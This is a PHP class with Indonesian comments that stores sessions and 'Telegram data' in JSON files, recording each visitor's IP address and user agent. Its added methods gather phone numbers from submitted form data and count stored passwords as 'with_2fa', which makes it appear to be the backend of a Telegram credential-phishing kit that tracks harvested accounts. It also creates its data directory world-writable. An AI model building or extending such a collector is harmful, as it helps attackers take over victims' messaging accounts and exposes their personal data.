<?php
class JsonSessionHandler implements SessionHandlerInterface
{
    private $sessionsPath;
    private $usersPath;
    
    public function __construct($dataDir = 'data') {
        // Create data directory if it doesn't exist
        if (!is_dir($dataDir)) {
            mkdir($dataDir, 0777, true);
        }
        
        $this->sessionsPath = $dataDir . '/sessions.json';
        $this->usersPath = $dataDir . '/users.json';
        
        // Initialize session file if it doesn't exist
        if (!file_exists($this->sessionsPath)) {
            file_put_contents($this->sessionsPath, json_encode([]));
        }
        
        // Initialize users file if it doesn't exist
        if (!file_exists($this->usersPath)) {
            file_put_contents($this->usersPath, json_encode([]));
        }
    }

    public function open($savePath, $sessionName) {
        return true;
    }

    public function close() {
        return true;
    }

    public function read($id) {
        $sessions = $this->getSessions();
        return isset($sessions[$id]) ? json_encode($sessions[$id]) : '';
    }

    public function write($id, $data) {
        $sessions = $this->getSessions();
        $sessions[$id] = json_decode($data, true) ?: [];
        
        // Add timestamp and client info
        $sessions[$id]['lastAccess'] = time();
        $sessions[$id]['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $sessions[$id]['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        $this->saveSessions($sessions);
        return true;
    }

    public function destroy($id) {
        $sessions = $this->getSessions();
        if (isset($sessions[$id])) {
            unset($sessions[$id]);
            $this->saveSessions($sessions);
        }
        return true;
    }

    public function gc($maxlifetime) {
        $sessions = $this->getSessions();
        $now = time();
        
        foreach ($sessions as $id => $session) {
            if (isset($session['lastAccess']) && $session['lastAccess'] + $maxlifetime < $now) {
                unset($sessions[$id]);
            }
        }
        
        $this->saveSessions($sessions);
        return true;
    }
    
    /**
     * Fungsi tambahan untuk menyimpan data ke users JSON
     * 
     * @param string $message Pesan yang akan disimpan
     * @param array $additionalData Data tambahan yang akan disimpan
     * @return bool
     */
    public function saveTelegramData($message, $additionalData = []) {
        $users = $this->getUsers();
        $sessionId = session_id();
        
        if (!isset($users[$sessionId])) {
            $users[$sessionId] = [];
        }
        
        $document = [
            'message' => $message,
            'timestamp' => time(),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'session_id' => $sessionId
        ];
        
        // Tambahkan data tambahan jika ada
        if (!empty($additionalData)) {
            foreach ($additionalData as $key => $value) {
                $document[$key] = $value;
            }
        }
        
        // Tambahkan dokumen ke array messages pengguna
        if (!isset($users[$sessionId]['messages'])) {
            $users[$sessionId]['messages'] = [];
        }
        
        $users[$sessionId]['messages'][] = $document;
        
        return $this->saveUsers($users);
    }
    
    /**
     * Fungsi untuk mendapatkan semua data telegram berdasarkan session ID
     * 
     * @param string $sessionId Session ID
     * @return array
     */
    public function getTelegramDataBySessionId($sessionId) {
        $users = $this->getUsers();
        
        if (isset($users[$sessionId]) && isset($users[$sessionId]['messages'])) {
            return $users[$sessionId]['messages'];
        }
        
        return [];
    }
    
    /**
     * Fungsi untuk mendapatkan semua data session
     * 
     * @return array
     */
    public function getAllSessions() {
        return $this->getSessions();
    }
    
    /**
     * Fungsi untuk mendapatkan semua nomor telepon yang unik
     * 
     * @return array
     */
    public function getUniquePhoneNumbers() {
        $users = $this->getUsers();
        $phoneNumbers = [];
        
        foreach ($users as $userData) {
            if (isset($userData['form_data']) && isset($userData['form_data']['phoneNumber'])) {
                $phoneNumber = $userData['form_data']['phoneNumber'];
                if (!in_array($phoneNumber, $phoneNumbers)) {
                    $phoneNumbers[] = $phoneNumber;
                }
            }
        }
        
        sort($phoneNumbers);
        return $phoneNumbers;
    }
    
    /**
     * Fungsi untuk mendapatkan statistik
     * 
     * @return array
     */
    public function getStatistics() {
        $sessions = $this->getSessions();
        $users = $this->getUsers();
        
        $totalSessions = count($sessions);
        $totalTelegramData = 0;
        $with2FA = 0;
        
        foreach ($users as $userData) {
            if (isset($userData['messages'])) {
                $totalTelegramData += count($userData['messages']);
            }
            
            if (isset($userData['password'])) {
                $with2FA++;
            }
        }
        
        $uniquePhones = count($this->getUniquePhoneNumbers());
        
        return [
            'total_sessions' => $totalSessions,
            'total_telegram_data' => $totalTelegramData,
            'unique_phones' => $uniquePhones,
            'with_2fa' => $with2FA
        ];
    }
    
    // Private helper methods
    private function getSessions() {
        $content = file_get_contents($this->sessionsPath);
        return json_decode($content, true) ?: [];
    }
    
    private function saveSessions($sessions) {
        return file_put_contents($this->sessionsPath, json_encode($sessions, JSON_PRETTY_PRINT));
    }
    
    private function getUsers() {
        $content = file_get_contents($this->usersPath);
        return json_decode($content, true) ?: [];
    }
    
    private function saveUsers($users) {
        return file_put_contents($this->usersPath, json_encode($users, JSON_PRETTY_PRINT));
    }
}
